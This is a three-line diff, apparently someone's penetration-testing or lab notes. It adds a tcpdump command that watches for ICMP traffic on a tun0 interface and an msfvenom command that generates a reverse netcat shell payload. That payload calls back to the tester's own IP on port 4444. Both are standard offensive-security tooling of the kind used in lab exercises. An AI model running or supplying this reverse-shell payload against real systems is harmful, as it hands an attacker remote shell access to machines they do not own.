@@ -1,0 +1,3 @@
+tcpdump ip proto \\icmp -i tun0
+
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
